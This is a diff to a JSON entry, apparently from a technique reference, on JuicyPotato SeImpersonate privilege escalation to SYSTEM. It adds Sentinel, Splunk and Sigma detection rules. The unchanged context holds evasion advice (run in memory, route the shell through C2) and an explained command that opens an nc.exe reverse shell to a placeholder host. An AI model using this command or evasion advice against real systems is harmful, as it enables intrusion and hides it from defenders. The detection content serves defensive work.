@@ -104,7 +104,65 @@
       "MITRE T1134.001",
       "MITRE T1068"
     ],
-    "evasion": "Pick the potato that matches the OS (GodPotato for 2019/2022) to avoid crashes and alerts; run it in-memory; the SeImpersonate abuse itself is quiet - the noisy part is the spawned shell, so route it through an existing C2 channel."
+    "evasion": "Pick the potato that matches the OS (GodPotato for 2019/2022) to avoid crashes and alerts; run it in-memory; the SeImpersonate abuse itself is quiet - the noisy part is the spawned shell, so route it through an existing C2 channel.",
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "SeImpersonate - JuicyPotato to SYSTEM - Sentinel",
+        "logic": "DeviceProcessEvents\n| where FileName has \"Potato\" or (InitiatingProcessFileName in~ (\"sqlservr.exe\",\"w3wp.exe\") and AccountName has \"SYSTEM\")\n| project Timestamp, DeviceName, AccountName, FileName, InitiatingProcessFileName, ProcessCommandLine\n| sort by Timestamp desc",
+        "data_source": "defender-endpoint",
+        "attack": [
+          "T1134.001"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium"
+      },
+      {
+        "platform": "splunk",
+        "name": "SeImpersonate - JuicyPotato to SYSTEM (1) - Splunk",
+        "logic": "index=sysmon EventCode=1 Image=\"*JuicyPotato*\"\n| table _time, Computer, User, CommandLine",
+        "data_source": "sysmon",
+        "attack": [
+          "T1134.001"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "log_ids": [
+          "1"
+        ]
+      },
+      {
+        "platform": "splunk",
+        "name": "SeImpersonate - JuicyPotato to SYSTEM (2) - Splunk",
+        "logic": "index=sysmon EventCode=1 ParentImage=\"*sqlservr.exe\" OR ParentImage=\"*w3wp.exe\"\n| where User=\"*SYSTEM\"\n| table _time, Computer, ParentImage, Image",
+        "data_source": "sysmon",
+        "attack": [
+          "T1134.001"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "log_ids": [
+          "1"
+        ]
+      },
+      {
+        "platform": "sigma",
+        "name": "proc_creation_win_hktl_juicypotato",
+        "logic": "proc_creation_win_hktl_juicypotato",
+        "data_source": "sysmon",
+        "attack": [
+          "T1134.001"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium"
+      }
+    ],
+    "visibility": {
+      "requires": [
+        "defender-endpoint",
+        "sysmon"
+      ]
+    }
   },
   "explain": "Abuses SeImpersonatePrivilege via DCOM/BITS to capture a SYSTEM token (JuicyPotato):\n  JuicyPotato.exe          the potato exploit\n  -l 53375                 the local COM server port it listens on\n  -p c:\\windows\\system32\\cmd.exe   the program to launch as SYSTEM\n  -a \"/c c:\\tools\\nc.exe <lhost> <lport> -e cmd.exe\"   its arguments (here a reverse shell)\n  -t *                     try both token-creation methods\nWorks on pre-2019 Windows; use PrintSpoofer/GodPotato on newer builds."
 }
